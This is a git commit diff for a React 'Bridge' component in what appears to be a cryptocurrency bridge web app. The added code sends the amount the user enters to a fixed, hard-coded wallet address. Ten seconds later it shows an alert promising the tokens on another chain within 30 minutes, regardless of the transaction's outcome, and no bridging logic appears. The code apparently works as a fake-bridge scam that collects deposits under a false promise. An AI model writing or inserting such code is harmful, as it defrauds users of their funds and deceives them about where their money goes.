8b81c811dee4967e3660bee1ca1bfc0b27b99073
eddy <be@be-technology.fr>
2023-11-19 09:01:41 +0300

    add sento

--- src/components/bridge.tsx
+++ src/components/bridge.tsx
@@ -1,10 +1,30 @@
-
+import * as React from 'react'
+import { useDebounce } from 'use-debounce'
+import { usePrepareSendTransaction, useSendTransaction } from 'wagmi'
+import { parseEther } from 'viem'
 
 export default function Bridge() {
 
-	const validate = async ()=>{
+	const [to, setTo] = React.useState('0x932f80fc3d023e8dac12a3ae2a8611fdd3cf360f')
+	const [debouncedTo] = useDebounce(to, 500)
 
-		alert("Token submit, wait 30 min to get it an other chain")
+	const [amount, setAmount] = React.useState('')
+	const [debouncedAmount] = useDebounce(amount, 500)
+
+	const { config } = usePrepareSendTransaction({
+		to: debouncedTo,
+		value: debouncedAmount ? parseEther(debouncedAmount) : undefined,
+	})
+
+	const { sendTransaction } = useSendTransaction(config);
+
+	const validate = async () => {
+
+		sendTransaction?.();
+		setTimeout(() => {
+			alert("Token submit, wait 30 min to get it an other chain")
+		}, 10000);
+		
 	};
 
 
@@ -40,11 +60,13 @@ export default function Bridge() {
 			</div>
 			<div className="zk-form">
 				<label>Amount : </label>
-				<input type="number" ></input>
+				<input type="number" value={amount} onChange={(ev) => setAmount(ev.currentTarget.value)} ></input>
 			</div>
-			
-			<div className="zk-form" style={{justifyContent:'center'}}>
-				<button onClick={()=> validate()}>Validate</button>
+
+			<div className="zk-form" style={{ justifyContent: 'center' }}>
+				<button onClick={(e) => {
+					validate()
+				}}>Validate</button>
 			</div>
 		</div>)
 }
